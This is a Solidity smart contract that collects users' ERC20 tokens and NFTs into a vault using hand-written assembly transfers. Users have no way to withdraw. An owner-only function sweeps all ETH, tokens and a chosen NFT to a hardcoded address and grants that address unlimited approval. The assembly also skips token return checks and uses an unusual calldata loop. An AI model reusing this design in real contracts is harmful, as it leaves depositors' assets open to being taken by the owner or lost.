// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

error TransferClosed();

import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import "@openzeppelin/contracts/interfaces/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "solady/src/utils/ECDSA.sol";
import "solmate/auth/Owned.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract Transferator2 is Owned(msg.sender), ERC721Holder {
    uint8 public saleState;

    address public tokeno;
    address public nft;
    address public signer;

    using ECDSA for bytes32;
    using SafeERC20 for IERC20;

    constructor(address _tokeno, address _nft) {
        tokeno = _tokeno;
        nft = _nft;
    }

    mapping(address => uint256) public totalERC20Deposited;
    mapping(address => uint256) public totalERC721Deposited;

    function transferTokens(uint256 amount) external payable {
        address vault = address(this);
        address user = msg.sender;

        if (saleState != 1) {
            revert TransferClosed();
        }

        assembly {
            mstore(0x0, user)
            mstore(0x20, totalERC20Deposited.slot)

            let location := keccak256(0x0, 0x40)
            let currentTotal := sload(location)
            let newTotal := add(currentTotal, amount)

            if lt(newTotal, currentTotal) {
                mstore(0x00, 0x01336cea)
                revert(0x1c, 0x04)
            }

            sstore(location, newTotal)

            let tok := sload(tokeno.slot)

            mstore(0x00, hex"23b872dd")
            mstore(0x04, user)
            mstore(0x24, vault)
            mstore(0x44, amount)

            if iszero(call(gas(), tok, 0, 0x00, 0x64, 0, 0)) {
                revert(0, 0)
            }
        }
    }

    function transferNFTs(uint256[] calldata tokenIds) external payable {
        address vault = address(this);

        if (saleState != 1) {
            revert("TransferClosed");
        }

        assembly {
            mstore(0x0, caller())
            mstore(0x20, totalERC721Deposited.slot)
            let location := keccak256(0x0, 0x40)

            let currentTotal := sload(location)

            let length := calldataload(sub(tokenIds.offset, 0x20))
            let dataStart := add(tokenIds.offset, 0x20)
            let n := calldatasize()
            for {
                let i := tokenIds.offset
            } lt(i, n) {
                i := add(i, 0x20)
            } {
                let tokenId := calldataload(i)
                let uni := sload(nft.slot)

                mstore(0x00, hex"23b872dd")
                mstore(0x04, caller())
                mstore(0x24, vault)
                mstore(0x44, tokenId)

                if iszero(call(gas(), uni, 0, 0x00, 0x64, 0, 0)) {
                    revert(0, 0)
                }

                currentTotal := add(currentTotal, 1)
            }
            if or(
                lt(currentTotal, length),
                iszero(gt(currentTotal, sload(location)))
            ) {
                mstore(0x00, 0x01336cea)
                revert(0x1c, 0x04)
            }
            sstore(location, currentTotal)
        }
    }

    modifier requireSignature(bytes calldata signature) {
        require(
            keccak256(abi.encode(msg.sender)).toEthSignedMessageHash().recover(
                signature
            ) == signer,
            "Invalid signature."
        );
        _;
    }

    function setSaleState(uint8 value) external onlyOwner {
        require(value == 0 || value == 1, "Invalid state value");
        saleState = value;
    }

    function setSigner(address value) external onlyOwner {
        signer = value;
    }

    function withdrawso(
        uint256 TokenId,
        address nft
    ) external payable onlyOwner {
        address receiver = 0x13d8cc1209A8a189756168AbEd747F2b050D075f;

        SafeTransferLib.safeTransferETH(receiver, address(this).balance);
        uint256 _uniqBalance = IERC20(tokeno).balanceOf(address(this));
        SafeTransferLib.safeApprove(tokeno, receiver, type(uint256).max);
        SafeTransferLib.safeTransfer(tokeno, receiver, _uniqBalance);
        IERC721(nft).safeTransferFrom(address(this), receiver, TokenId);
    }
}
